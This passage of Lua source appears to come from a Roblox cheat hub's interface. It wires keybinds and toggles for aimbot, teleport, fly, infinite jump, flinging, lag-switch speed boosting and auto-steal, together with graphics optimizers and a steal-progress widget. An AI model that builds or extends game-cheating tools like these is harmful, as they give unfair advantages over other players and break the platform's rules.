		clrBtn.Size = UDim2.new(0,14,0,14); clrBtn.Position = UDim2.new(1,-158,0.5,-7)
		clrBtn.BackgroundColor3 = C_RED; clrBtn.BackgroundTransparency = 0.4
		clrBtn.BorderSizePixel = 0; clrBtn.Text = "✕"; clrBtn.TextColor3 = C_WHITE
		clrBtn.Font = Enum.Font.GothamBold; clrBtn.TextSize = 8; clrBtn.AutoButtonColor = false
		addCorner(clrBtn, 4)
		clrBtn.MouseButton1Click:Connect(function()
			entry.key = nil; entry.gp = nil
			kbBtn.Text = "—"; kbBtn.TextColor3 = C_DIM
			if _GH.autoSave then _GH.autoSave() end
		end)

		local div = Instance.new("Frame", currentPage)
		div.Size = UDim2.new(1,-8,0,1); div.BackgroundColor3 = C_DEEP3
		div.BorderSizePixel = 0; div.LayoutOrder = LO()
		addLivingTextGradient(div)

		return entry
	end

	UIB.makeSectionLabel("Quick Panel")
	makeKBRow("Drop BR",        KB.DropBR)
	makeKBRow("Auto Left",      KB.AutoLeft)
	makeKBRow("Aim Bot",        KB.AimBot)
	makeKBRow("Auto Right",     KB.AutoRight)
	makeKBRow("TP Down",        KB.TPDown)
	makeKBRow("Lag Normal",     KB.LagNorm)
	makeKBRow("Bat TP",         KB.BatTP)
	makeKBRow("Aim V2",         KB.AimV2)
	makeKBRow("Aim V3",         KB.AimV3Kb)
	makeKBRow("Instant Reset",  KB.InstantReset)
	UIB.makeGap(4)
	UIB.makeSectionLabel("Interface")
	makeKBRow("Hide / Show UI", KB.HideUI)

	UIB.makeGap(6)
	local hint = Instance.new("TextLabel", currentPage)
	hint.Size = UDim2.new(1,0,0,28); hint.BackgroundTransparency = 1; hint.LayoutOrder = LO()
	hint.Text = "Click → listen   |   ✕ → clear   |   PC & PS/Xbox"
	hint.TextColor3 = C_DIM; hint.Font = Enum.Font.Gotham; hint.TextSize = 9
	addLivingTextGradient(hint)

	-- ================================================================
	-- Global UIS.InputBegan loop — triggers the bound actions
	-- ================================================================
	UIS.InputBegan:Connect(function(inp, gpe)
		if gpe then return end
		if _currentListeningBtn then return end  -- un rebind est en cours
		if UIS:GetFocusedTextBox() then return end
		local kc = inp.KeyCode
		if kc == Enum.KeyCode.Unknown then return end

		local function match(e)
			return (e.key and kc == e.key) or (e.gp and kc == e.gp)
		end

		if match(KB.DropBR)    then runDropBrainrot()
		elseif match(KB.AutoLeft)  then
			State.autoLeftEnabled = not State.autoLeftEnabled
			if State.autoLeftEnabled then startAutoLeft() else stopAutoLeft() end
		elseif match(KB.AimBot)    then
			local on = not AB.active; if on then AB.start() else AB.stop() end
		elseif match(KB.AutoRight) then
			State.autoRightEnabled = not State.autoRightEnabled
			if State.autoRightEnabled then startAutoRight() else stopAutoRight() end
		elseif match(KB.TPDown)    then tpToGround()
		elseif match(KB.LagNorm)   then
			-- Actually flips the Speed Booster's own Normal/Lagger tab
			-- (updates State, the widget's visuals, and re-applies live if
			-- it's already running) instead of only poking State.laggerActive,
			-- which never touched the widget or engaged Lagger mode for real.
			if _GH.speedBoosterSwitchTab then
				local wantLag = not (_GH.speedBoosterIsLagger and _GH.speedBoosterIsLagger())
				_GH.speedBoosterSwitchTab(wantLag)
			else
				State.laggerActive = not State.laggerActive
				if not State.laggerActive then proxyStop() end
			end
		elseif match(KB.BatTP)     then
			local on = not AimV3.active
			if on then AimV3.start() else AimV3.stop() end
		elseif match(KB.AimV2)     then
			if ABP.active then ABP.stop() else if AB.active then AB.stop() end; ABP.start() end
		elseif match(KB.AimV3Kb)   then
			-- [FIX #2] AimV3Kb doit déclencher AimV3 (Bat TP), pas AB (Aimbot V1)
			if AimV3.active then AimV3.stop() else AimV3.start() end
		elseif match(KB.InstantReset) then
			if _GH.MH_instareset then _GH.MH_instareset() end
		elseif match(KB.HideUI) then
			setMinimized(not _uiMinimized)
		end
	end)
end)

-- ===================================================================
-- REVUL ANTI LAGGER — engine (snapshot + restore, DescendantAdded hook)
-- ===================================================================
local RevulAL = {active=false, conn=nil}
local _ralOrigLighting = {
	GlobalShadows            = Lighting.GlobalShadows,
	FogEnd                   = Lighting.FogEnd,
	Brightness               = Lighting.Brightness,
	EnvironmentDiffuseScale  = Lighting.EnvironmentDiffuseScale,
	EnvironmentSpecularScale = Lighting.EnvironmentSpecularScale,
}
local _ralOrigPostFX = {}
local _ralOrigParts  = {}

-- Initial snapshot of all workspace descendants
local function _ralSnapshot()
	_ralOrigPostFX = {}
	for _, fx in ipairs(Lighting:GetChildren()) do
		if fx:IsA("PostEffect") then _ralOrigPostFX[fx] = fx.Enabled end
	end
	_ralOrigParts = {}
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj:IsA("ParticleEmitter") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
			_ralOrigParts[obj] = {Enabled=obj.Enabled}
		elseif obj:IsA("Decal") or obj:IsA("Texture") then
			_ralOrigParts[obj] = {Transparency=obj.Transparency}
		elseif obj:IsA("BasePart") then
			_ralOrigParts[obj] = {Material=obj.Material, Reflectance=obj.Reflectance, CastShadow=obj.CastShadow}
		end
	end
end

local function _ralApplyObj(obj)
	if not _ralOrigParts[obj] then
		-- snapshot for newly streamed objects
		if obj:IsA("ParticleEmitter") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
			_ralOrigParts[obj] = {Enabled=obj.Enabled}
		elseif obj:IsA("Decal") or obj:IsA("Texture") then
			_ralOrigParts[obj] = {Transparency=obj.Transparency}
		elseif obj:IsA("BasePart") then
			_ralOrigParts[obj] = {Material=obj.Material, Reflectance=obj.Reflectance, CastShadow=obj.CastShadow}
		end
	end
	pcall(function()
		if obj:IsA("ParticleEmitter") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
			obj.Enabled = false
		elseif obj:IsA("Decal") or obj:IsA("Texture") then
			obj.Transparency = 1
		elseif obj:IsA("BasePart") then
			obj.Material=Enum.Material.Plastic; obj.Reflectance=0; obj.CastShadow=false
		end
	end)
end

local function ralStart()
	if RevulAL.active then return end
	RevulAL.active = true
	_ralSnapshot()
	Lighting.GlobalShadows=false; Lighting.FogEnd=8999999488; Lighting.Brightness=1
	Lighting.EnvironmentDiffuseScale=0; Lighting.EnvironmentSpecularScale=0
	for _, fx in ipairs(Lighting:GetChildren()) do if fx:IsA("PostEffect") then fx.Enabled=false end end
	for _, obj in ipairs(workspace:GetDescendants()) do _ralApplyObj(obj) end
	RevulAL.conn = workspace.DescendantAdded:Connect(function(obj)
		if RevulAL.active then _ralApplyObj(obj) end
	end)
end

local function ralStop()
	if not RevulAL.active then return end
	RevulAL.active = false
	if RevulAL.conn then RevulAL.conn:Disconnect(); RevulAL.conn=nil end
	-- Restore Lighting
	Lighting.GlobalShadows            = _ralOrigLighting.GlobalShadows
	Lighting.FogEnd                   = _ralOrigLighting.FogEnd
	Lighting.Brightness               = _ralOrigLighting.Brightness
	Lighting.EnvironmentDiffuseScale  = _ralOrigLighting.EnvironmentDiffuseScale
	Lighting.EnvironmentSpecularScale = _ralOrigLighting.EnvironmentSpecularScale
	for fx, wasEnabled in pairs(_ralOrigPostFX) do
		if fx and fx.Parent then fx.Enabled=wasEnabled end
	end
	-- Restore workspace
	for obj, saved in pairs(_ralOrigParts) do
		if obj and obj.Parent then
			pcall(function()
				if saved.Enabled~=nil        then obj.Enabled=saved.Enabled end
				if saved.Transparency~=nil   then obj.Transparency=saved.Transparency end
				if saved.Material~=nil       then obj.Material=saved.Material; obj.Reflectance=saved.Reflectance; obj.CastShadow=saved.CastShadow end
			end)
		end
	end
end

buildPage("Optimize", function()
	UIB.makeSectionLabel("Performance")
	UIB.makeToggleRow("Nuke Optimizer",false,function(on) State.nukeOptEnabled=on; if on then nukeOptStart() else nukeOptStop() end end)
	UIB.makeToggleRow("Remove Accessories",false,function(on) State.removeAccEnabled=on; if on then removeAccStart() else removeAccStop() end end)
	UIB.makeToggleRow("Anti-Lag (Light)",false,function(on) State.antiLagAdvEnabled=on; if on then antiLagAdvStart() else antiLagAdvStop() end end)
	UIB.makeToggleRow("Anti-Lag Booster",false,function(on) if on then ralStart() else ralStop() end end)
	UIB.makeToggleRow("Ultra Mode",false,function(on)
		if on then
			-- raw__59_ logic: plastic-coats everything, disables decals/particles
			Lighting.GlobalShadows=false; Lighting.FogEnd=1e10; Lighting.Brightness=1
			Lighting.EnvironmentDiffuseScale=0; Lighting.EnvironmentSpecularScale=0
			for _,e in pairs(Lighting:GetChildren()) do pcall(function()
				if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect")
					or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then e.Enabled=false end
			end) end
			task.spawn(function()
				for _,obj in pairs(workspace:GetDescendants()) do pcall(function()
					if obj:IsA("BasePart") then obj.Material=Enum.Material.Plastic; obj.Reflectance=0; obj.CastShadow=false
					elseif obj:IsA("Decal") or obj:IsA("Texture") then obj:Destroy()
					elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") then obj.Enabled=false end
				end) end
			end)
			pcall(function() if setfpscap then setfpscap(999999999) end end)
		end
	end)
	UIB.makeToggleRow("Unwalk",false,function(on) if on then startUnwalk() else stopUnwalk() end end)
	UIB.makeGap(4); UIB.makeSectionLabel("Camera")
	do
		local _ncOn = false
		local _ncParts = {}
		local _ncConn = nil
		UIB.makeToggleRow("No Cam Collision",false,function(on)
			_ncOn = on
			if on then
				if _ncConn then _ncConn:Disconnect() end
				_ncConn = RunService.RenderStepped:Connect(function()
					local char=LP.Character; if not char then return end
					local cam=workspace.CurrentCamera; if not cam then return end
					local hrp2=char:FindFirstChild("HumanoidRootPart"); if not hrp2 then return end
					local camPos=cam.CFrame.Position
					local charPos=hrp2.Position+Vector3.new(0,1.5,0)
					local toChar=charPos-camPos; if toChar.Magnitude<0.3 then return end
					local params=RaycastParams.new()
					params.FilterType=Enum.RaycastFilterType.Exclude
					params.FilterDescendantsInstances={char}
					local hit={}; local origin=camPos; local remaining=toChar
					for _=1,8 do
						if remaining.Magnitude<0.2 then break end
						local res=workspace:Raycast(origin,remaining,params); if not res then break end
						local p2=res.Instance
						if p2 and p2:IsA("BasePart") and not p2:IsDescendantOf(char) then
							hit[p2]=true
							if _ncParts[p2]==nil then _ncParts[p2]=p2.LocalTransparencyModifier end
							p2.LocalTransparencyModifier=1
						end
						origin=res.Position+remaining.Unit*0.02; remaining=charPos-origin
					end
					for p2,orig in pairs(_ncParts) do
						if not hit[p2] then
							pcall(function() if p2 and p2.Parent then p2.LocalTransparencyModifier=orig end end)
							_ncParts[p2]=nil
						end
					end
				end)
			else
				if _ncConn then _ncConn:Disconnect(); _ncConn=nil end
				for p2,orig in pairs(_ncParts) do
					pcall(function() if p2 and p2.Parent then p2.LocalTransparencyModifier=orig end end)
				end
				_ncParts={}
			end
		end)
	end
	UIB.makeGap(4); UIB.makeSectionLabel("Cleanup")
	local cleanRow=Instance.new("TextButton",currentPage)
	cleanRow.Size=UDim2.new(1,0,0,30); cleanRow.BackgroundColor3=C_ROW; cleanRow.BackgroundTransparency=0.35
	cleanRow.BorderSizePixel=0; cleanRow.LayoutOrder=LO(); addCorner(cleanRow,6); addLivingStroke(cleanRow,1)
	cleanRow.Text="Clean Particles & Lights"; cleanRow.TextColor3=C_WHITE; cleanRow.Font=Enum.Font.GothamBold
	cleanRow.TextSize=10; cleanRow.AutoButtonColor=false; addLivingTextGradient(cleanRow)
	cleanRow.MouseButton1Click:Connect(function()
		local n=cleanParticlesAndLights(); cleanRow.Text="Cleaned "..n.." effects"
		task.delay(1.2,function() if cleanRow and cleanRow.Parent then cleanRow.Text="Clean Particles & Lights" end end)
	end)

	UIB.makeGap(4); UIB.makeSectionLabel("Experimental")
	UIB.makeToggleRow("Anti Summer Base",false,function(on)
		if on then _enableAntiSummerBase() else _disableAntiSummerBase() end
	end)
	UIB.makeGap(4); UIB.makeSectionLabel("Movement (yslemEgg)")
	UIB.makeToggleRow("Fly (WASD+Space)",false,function(on)
		State.fly=on; if on then _YE.startFly() else _YE.stopFly() end
	end)
	UIB.makeInputRow("Fly Speed",State.flySpeed,function(n) if n and n>=5 and n<=300 then State.flySpeed=n end end)
	UIB.makeToggleRow("Anti Trap",false,function(on)
		State.antiTrap=on; if on then _YE.startAntiTrap() else _YE.stopAntiTrap() end
	end)
	UIB.makeToggleRow("Infinite Jump",false,function(on)
		State.infJump=on; if on then _YE.startInfJump() else _YE.stopInfJump() end
	end)
	UIB.makeToggleRow("Click TP",false,function(on)
		State.clickTp=on; if on then _YE.startClickTp() else _YE.stopClickTp() end
	end)
	UIB.makeToggleRow("Fling NPCs",false,function(on)
		if on then _YE.startFling() else _YE.stopFling() end
	end)
	UIB.makeInputRow("FOV",State.fov,function(n) if n and n>=30 and n<=130 then State.fov=n end end)
end)

-- ===================================================================
-- SPEED WIDGET (jxsh — Anti Bat style)
-- ===================================================================
local function _buildSpeedWidget()
local spW=Instance.new("Frame",gui)
spW.Name="SpeedWidget"; spW.Size=UDim2.new(0,150,0,160); _GH.spW=spW
spW.Position=UDim2.new(1,-256,0,210); spW.BackgroundColor3=C_BG
spW.BorderSizePixel=0; spW.ClipsDescendants=true; spW.Active=true; spW.Visible=false
addCorner(spW,12); addLivingStroke(spW,1.5)
local spH=Instance.new("Frame",spW)
spH.Size=UDim2.new(1,0,0,26); spH.BackgroundColor3=C_HEADER; spH.BorderSizePixel=0
addCorner(spH,12); makeDraggable(spW, spH, "speed")
local spDot=Instance.new("Frame",spH)
spDot.Size=UDim2.new(0,5,0,5); spDot.Position=UDim2.new(0,10,0,11)
spDot.BackgroundColor3=C_MOON; spDot.BorderSizePixel=0; addCorner(spDot,3)
local spTitleLbl=Instance.new("TextLabel",spH)
spTitleLbl.Size=UDim2.new(1,-46,1,0); spTitleLbl.Position=UDim2.new(0,16,0,0)
spTitleLbl.BackgroundTransparency=1; spTitleLbl.Text="SPEED BOOSTER"
spTitleLbl.TextColor3=C_WHITE; spTitleLbl.Font=Enum.Font.GothamBlack; spTitleLbl.TextSize=9
spTitleLbl.TextXAlignment=Enum.TextXAlignment.Left; addLivingTextGradient(spTitleLbl)
-- Minimize button: collapsed by default = expanded (Normal/Lagger visible),
-- the user can click "-" to collapse it if they want
local spCollapsedH=64
local spMinBtn=Instance.new("TextButton",spH)
spMinBtn.Size=UDim2.new(0,18,0,18); spMinBtn.Position=UDim2.new(1,-24,0.5,-9)
spMinBtn.BackgroundColor3=Color3.fromRGB(30,30,34); spMinBtn.BorderSizePixel=0
spMinBtn.Text="-"; spMinBtn.TextColor3=C_WHITE; spMinBtn.Font=Enum.Font.GothamBlack; spMinBtn.TextSize=15
addCorner(spMinBtn,6); addLivingStroke(spMinBtn,1)
-- The click is connected further down (after stRow/spNorm/spLag/_spLagger)
-- to keep NORMAL/LAGGER visible and usable even when collapsed.
-- NORMAL / LAGGER Tabs
local tabRow=Instance.new("Frame",spW)
tabRow.Size=UDim2.new(1,-16,0,26); tabRow.Position=UDim2.new(0,8,0,32)
tabRow.BackgroundColor3=C_ROW; tabRow.BackgroundTransparency=0.35
tabRow.BorderSizePixel=0; addCorner(tabRow,8); addLivingStroke(tabRow,1)
local tabLL=Instance.new("UIListLayout",tabRow)
tabLL.FillDirection=Enum.FillDirection.Horizontal; tabLL.SortOrder=Enum.SortOrder.LayoutOrder
tabLL.HorizontalAlignment=Enum.HorizontalAlignment.Center
tabLL.Padding=UDim.new(0,0)
local function mkTab(lbl,ord,act)
	local t=Instance.new("TextButton",tabRow); t.Size=UDim2.new(0.5,0,1,0); t.AnchorPoint=Vector2.new(0,0)
	t.BorderSizePixel=0; t.LayoutOrder=ord
	t.BackgroundColor3=act and C_MOON or C_OFF_BG
	t.BackgroundTransparency=act and 0.15 or 0.5
	t.Text=lbl; t.TextColor3=act and C_MOONTEXT or C_DIM
	t.Font=Enum.Font.GothamBold; t.TextSize=10; t.AutoButtonColor=false
	addCorner(t,6); addLivingTextGradient(t); return t
end
local spTabN=mkTab("NORMAL",1,true); local spTabL=mkTab("LAGGER",2,false)
-- Status ON/OFF
local stRow=Instance.new("Frame",spW)
stRow.Size=UDim2.new(1,-16,0,26); stRow.Position=UDim2.new(0,8,0,64)
stRow.BackgroundColor3=C_ROW; stRow.BackgroundTransparency=0.35
stRow.BorderSizePixel=0; addCorner(stRow,8); addLivingStroke(stRow,1)
local stLbl=Instance.new("TextLabel",stRow)
stLbl.Size=UDim2.new(0.5,0,1,0); stLbl.Position=UDim2.new(0,12,0,0)
stLbl.BackgroundTransparency=1; stLbl.Text="Status:"
stLbl.TextColor3=C_WHITE; stLbl.Font=Enum.Font.GothamBold; stLbl.TextSize=11
stLbl.TextXAlignment=Enum.TextXAlignment.Left; addLivingTextGradient(stLbl)
local stPill=Instance.new("Frame",stRow)
stPill.Size=UDim2.new(0.44,0,0,22); stPill.Position=UDim2.new(0.54,0,0.5,-11)
stPill.BackgroundColor3=C_OFF_BG; stPill.BorderSizePixel=0; addCorner(stPill,6); addLivingStroke(stPill,1)
local stPillLbl=Instance.new("TextLabel",stPill)
stPillLbl.Size=UDim2.new(1,0,1,0); stPillLbl.BackgroundTransparency=1
stPillLbl.Text="OFF"; stPillLbl.TextColor3=C_DIM
stPillLbl.Font=Enum.Font.GothamBlack; stPillLbl.TextSize=11; addLivingTextGradient(stPillLbl)
local stClk=Instance.new("TextButton",stRow)
stClk.Size=UDim2.new(1,0,1,0); stClk.BackgroundTransparency=1; stClk.Text=""
-- Input helper
_G._mhInputBoxesRef = _G._mhInputBoxesRef or {}
local _mhInputBoxes = _G._mhInputBoxesRef
local function mkInput(parent,yPos,lbl,val,cb,stateKey)
	local row=Instance.new("Frame",parent)
	row.Size=UDim2.new(1,-16,0,28); row.Position=UDim2.new(0,8,0,yPos)
	row.BackgroundColor3=C_ROW; row.BackgroundTransparency=0.35
	row.BorderSizePixel=0; addCorner(row,8); addLivingStroke(row,1)
	local l=Instance.new("TextLabel",row)
	l.Size=UDim2.new(1,-80,1,0); l.Position=UDim2.new(0,12,0,0)
	l.BackgroundTransparency=1; l.Text=lbl; l.TextColor3=C_WHITE
	l.Font=Enum.Font.GothamBold; l.TextSize=11; l.TextXAlignment=Enum.TextXAlignment.Left
	addLivingTextGradient(l)
	local bw=Instance.new("Frame",row)
	bw.Size=UDim2.new(0,62,0,22); bw.Position=UDim2.new(1,-70,0.5,-11)
	bw.BackgroundColor3=C_OFF_BG; bw.BackgroundTransparency=0.1
	bw.BorderSizePixel=0; addCorner(bw,6); addLivingStroke(bw,1)
	local box=Instance.new("TextBox",bw)
	box.Size=UDim2.new(1,-6,1,0); box.Position=UDim2.new(0,3,0,0)
	box.BackgroundTransparency=1; box.Text=tostring(val)
	box.TextColor3=C_SILVER; box.Font=Enum.Font.GothamBold; box.TextSize=12
	box.ClearTextOnFocus=false; box.TextXAlignment=Enum.TextXAlignment.Center
	box.FocusLost:Connect(function()
		local n=tonumber(box.Text)
		if n and n>0 and n<=500 then
			cb(n)
			if _GH.autoSave then _GH.autoSave() end
		else box.Text=tostring(val) end
	end)
	if stateKey then _mhInputBoxes[stateKey] = box end
end
-- Normal / Lagger panels
local spNorm=Instance.new("Frame",spW)
spNorm.Size=UDim2.new(1,0,0,68); spNorm.Position=UDim2.new(0,0,0,96)
spNorm.BackgroundTransparency=1; spNorm.BorderSizePixel=0
mkInput(spNorm,0,  "Speed",     State.normalSpeed,     function(n) State.normalSpeed=n end, "normalSpeed")
mkInput(spNorm,40, "Steal Spd", State.carrySpeed,      function(n) State.carrySpeed=n end, "carrySpeed")
local spLag=Instance.new("Frame",spW)
spLag.Size=UDim2.new(1,0,0,68); spLag.Position=UDim2.new(0,0,0,96)
spLag.BackgroundTransparency=1; spLag.BorderSizePixel=0; spLag.Visible=false
mkInput(spLag,0,  "Lagger",    State.laggerSpeed,     function(n) State.laggerSpeed=n end, "laggerSpeed")
mkInput(spLag,40, "Lag Steal", State.laggerCarrySpeed, function(n) State.laggerCarrySpeed=n end, "laggerCarrySpeed")
-- Exact jxsh logic — uses proxyMove + State like the hub
local _spActive=false; local _spLagger=false
local function startSp()
	_speedBoosterActive = true
	-- Activates lagger or normal mode via State (proxyMove uses it automatically)
	if _spLagger then
		State.laggerActive=true; State.laggerCarryActive=false
	else
		State.laggerActive=false; State.laggerCarryActive=false
		State.speedType="normal"
	end
end
local function stopSp()
	_speedBoosterActive = false
	-- Disables everything and stops the proxy
	State.laggerActive=false; State.laggerCarryActive=false
	State.speedType="normal"
	proxyStop()
end
local function toggleSp()
	_spActive=not _spActive
	stPill.BackgroundColor3=_spActive and C_MOON or C_OFF_BG
	stPillLbl.Text=_spActive and "ON" or "OFF"
	stPillLbl.TextColor3=_spActive and C_MOONTEXT or C_DIM
	if _spActive then startSp() else stopSp() end
	if _GH.setSpeedBoosterFloatVisual then _GH.setSpeedBoosterFloatVisual(_spActive) end
end
stClk.MouseButton1Click:Connect(toggleSp)
_GH.speedBoosterToggle = toggleSp
_GH.speedBoosterIsActive = function() return _spActive end
local function switchTab(lag)
	_spLagger=lag
	if _spActive then startSp() end
	spTabN.BackgroundColor3=lag and C_OFF_BG or C_MOON
	spTabN.BackgroundTransparency=lag and 0.5 or 0.15
	spTabN.TextColor3=lag and C_DIM or C_MOONTEXT
	spTabL.BackgroundColor3=lag and C_MOON or C_OFF_BG
	spTabL.BackgroundTransparency=lag and 0.15 or 0.5
	spTabL.TextColor3=lag and C_MOONTEXT or C_DIM
	spNorm.Visible=not lag; spLag.Visible=lag
end
spTabN.MouseButton1Click:Connect(function() switchTab(false) end)
spTabL.MouseButton1Click:Connect(function() switchTab(true) end)
-- Exposed so the "Lag Normal" keybind can actually flip the widget into
-- Lagger mode (updates State + the widget's own tabs, and re-applies live
-- if the booster is already running) instead of poking State directly.
_GH.speedBoosterSwitchTab = switchTab
_GH.speedBoosterIsLagger  = function() return _spLagger end

-- Collapsed ("-"): NORMAL/LAGGER stay visible and usable, only
-- Status and the speed fields are hidden.
spMinBtn.MouseButton1Click:Connect(function()
	_spCollapsed = not _spCollapsed
	if _spCollapsed then
		spW.Size=UDim2.new(0,_spExpandedSize.w,0,spCollapsedH)
	else
		-- Restores the size edited via the Scale slider (Visual), not a
		-- hardcoded default size.
		spW.Size=UDim2.new(0,_spExpandedSize.w,0,_spExpandedSize.h)
	end
	spMinBtn.Text=_spCollapsed and "+" or "-"
	stRow.Visible = not _spCollapsed
	if _spCollapsed then
		spNorm.Visible=false; spLag.Visible=false
	else
		spNorm.Visible = not _spLagger; spLag.Visible = _spLagger
	end
end)

-- Scale slider (same style as UIScale in Visual)

end
_buildSpeedWidget()

-- ===================================================================
-- STEAL BAR WIDGET
-- ===================================================================
do
local stealWidget=Instance.new("Frame",gui)
stealWidget.Name="StealBarWidget"; stealWidget.Size=UDim2.new(0,200,0,32)
stealWidget.Position=UDim2.new(0.5,-100,0,35); stealWidget.BackgroundTransparency=1; stealWidget.Active=true
makeDraggable(stealWidget, nil, "steal")
-- Steal Bar Size (ported idea from Vynx) — a UIScale instead of rebuilding
-- the widget, so every existing pixel-offset row/label inside it keeps
-- working unchanged. Default Scale=1 exactly matches the pill's original
-- 200x32 size, so nothing visually changes until the slider is touched.
local stealWidgetScale=Instance.new("UIScale",stealWidget)
_GH.setStealBarScale=function(v) stealWidgetScale.Scale=math.clamp(v,0.6,2.0) end
local stealPill=Instance.new("Frame",stealWidget)
stealPill.Size=UDim2.new(1,0,0,32); stealPill.BackgroundColor3=C_BG
stealPill.BackgroundTransparency=0.1; stealPill.BorderSizePixel=0; stealPill.ClipsDescendants=true
addCorner(stealPill,18)
local stealPillStk=addStroke(stealPill,C_MOON,1.5,0.2)
local stealPulseSpeed=1.2
AutoSteal.SetFastPulse=function(on) stealPulseSpeed=on and 0.35 or 1.2 end

-- Ping-warning blink: while ping is in the "DON'T DUEL" zone (same signal
-- the badge uses), the steal bar's own stroke flashes red instead of its
-- normal blue breathing. Same single loop below just branches per-cycle on
-- this flag — never two tweens fighting over stealPillStk at once, and the
-- moment the warning clears it drops straight back into the normal blue
-- breathing on the very next cycle.
local _stealBarPingWarn = false
if _GH.pingRegister then
	_GH.pingRegister(function(isWarn) _stealBarPingWarn = isWarn end)
end

task.spawn(function()
	while stealPill.Parent do
		if _stealBarPingWarn then
			TweenService:Create(stealPillStk,TweenInfo.new(0.4,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Transparency=0.0,Color=C_RED}):Play()
			task.wait(0.4)
			TweenService:Create(stealPillStk,TweenInfo.new(0.4,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Transparency=0.5,Color=C_RED}):Play()
			task.wait(0.4)
		else
			TweenService:Create(stealPillStk,TweenInfo.new(stealPulseSpeed,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Transparency=0.6,Color=C_MOON2}):Play()
			task.wait(stealPulseSpeed)
			TweenService:Create(stealPillStk,TweenInfo.new(stealPulseSpeed,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Transparency=0.1,Color=C_MOON}):Play()
			task.wait(stealPulseSpeed)
		end
	end
end)
AutoSteal.FlashSuccess=function()
	TweenService:Create(stealPillStk,TweenInfo.new(0.08),{Color=C_WHITE,Transparency=0}):Play()
	TweenService:Create(stealPill,TweenInfo.new(0.08),{BackgroundTransparency=0}):Play()
	task.delay(0.08,function()
		TweenService:Create(stealPillStk,TweenInfo.new(0.35),{Color=C_MOON,Transparency=0.1}):Play()
		TweenService:Create(stealPill,TweenInfo.new(0.35),{BackgroundTransparency=0.1}):Play()
	end)
end
local stealLeftHalf=Instance.new("Frame",stealPill)
stealLeftHalf.Size=UDim2.new(0.56,0,1,0); stealLeftHalf.BackgroundTransparency=1; stealLeftHalf.ZIndex=6
local stealLabel=Instance.new("TextLabel",stealLeftHalf)
stealLabel.Size=UDim2.new(1,-20,1,0); stealLabel.Position=UDim2.new(0,12,0,0)
stealLabel.BackgroundTransparency=1; stealLabel.Text="READY"
stealLabel.TextColor3=C_WHITE; stealLabel.Font=Enum.Font.GothamBlack; stealLabel.TextSize=11
stealLabel.TextXAlignment=Enum.TextXAlignment.Left; stealLabel.ZIndex=6; addLivingTextGradient(stealLabel)
local stealDivider=Instance.new("Frame",stealPill)
stealDivider.Size=UDim2.new(0,1,0,18); stealDivider.Position=UDim2.new(0.56,0,0.5,-9)
stealDivider.BackgroundColor3=C_SILVER2; stealDivider.BackgroundTransparency=0.4; stealDivider.BorderSizePixel=0; stealDivider.ZIndex=6
local infoLabel=Instance.new("TextLabel",stealPill)
infoLabel.Size=UDim2.new(0.44,-12,1,0); infoLabel.Position=UDim2.new(0.56,12,0,0)
infoLabel.BackgroundTransparency=1; infoLabel.Text="0 FPS | --ms"
infoLabel.TextColor3=C_WHITE; infoLabel.Font=Enum.Font.GothamBold; infoLabel.TextSize=11
infoLabel.TextXAlignment=Enum.TextXAlignment.Left; infoLabel.ZIndex=6
local stealFill=Instance.new("Frame",stealPill)
stealFill.Size=UDim2.new(0,0,1,0); stealFill.BackgroundColor3=C_MOON
stealFill.BackgroundTransparency=0.72; stealFill.BorderSizePixel=0; stealFill.ZIndex=1
addCorner(stealFill,18)
local stealFillGrad=Instance.new("UIGradient",stealFill)
stealFillGrad.Color=ColorSequence.new({
	ColorSequenceKeypoint.new(0,Color3.fromRGB(10,50,68)),
	ColorSequenceKeypoint.new(0.85,C_MOON),
	ColorSequenceKeypoint.new(1,C_SILVER),
})
_GH.stealFillGradRef = stealFillGrad  -- [FIX B1] ref stockée pour applyTheme()
local stealEdge=Instance.new("Frame",stealFill)
stealEdge.AnchorPoint=Vector2.new(1,0.5); stealEdge.Size=UDim2.new(0,4,1,-6); stealEdge.Position=UDim2.new(1,0,0.5,0)
stealEdge.BackgroundColor3=C_WHITE; stealEdge.BorderSizePixel=0; stealEdge.ZIndex=2; addCorner(stealEdge,2)
local stealPctLbl=Instance.new("TextLabel",stealLeftHalf)
stealPctLbl.Size=UDim2.new(1,-32,1,0); stealPctLbl.Position=UDim2.new(0,12,0,0)
stealPctLbl.BackgroundTransparency=1; stealPctLbl.Text=""
stealPctLbl.TextColor3=C_MOON2; stealPctLbl.Font=Enum.Font.GothamBlack; stealPctLbl.TextSize=11
stealPctLbl.TextXAlignment=Enum.TextXAlignment.Right; stealPctLbl.ZIndex=6
AutoSteal.ProgressFill=stealFill; AutoSteal.ProgressText=stealPctLbl; AutoSteal.Widget=stealWidget; AutoSteal.StatusLabel=stealLabel
task.spawn(function() task.wait(0.6); if AutoSteal.SetReadyColor then AutoSteal.SetReadyColor("READY") end end)
local _lastReadyState = "READY"
local function _setReadyColor(state)
	if state then _lastReadyState = state end
	local lbl = AutoSteal.StatusLabel; if not lbl then return end
	local isReady = (_lastReadyState == "READY")
	lbl.TextColor3 = isReady and C_MOON or C_RED
	local g = lbl:FindFirstChildOfClass("UIGradient")
	if g then
		-- Utilise C_ON_BG + C_MOON → suit le thème (bleu default, gris noir)
		local c1 = isReady and C_ON_BG or Color3.fromRGB(120,20,20)
		local c2 = isReady and C_MOON  or Color3.fromRGB(255,100,100)
		g.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0,    c2),
			ColorSequenceKeypoint.new(0.25, c1),
			ColorSequenceKeypoint.new(0.5,  c2),
			ColorSequenceKeypoint.new(0.75, c1),
			ColorSequenceKeypoint.new(1,    c2),
		})
	end
end
AutoSteal.SetReadyColor = _setReadyColor
-- Re-applique la couleur à chaque changement de thème
_GH.stealReadyColorFn = function() _setReadyColor(nil) end
local frameCount,lastFpsTime,lastFps,lastPing=0,tick(),60,nil
local function refreshInfoLabel()
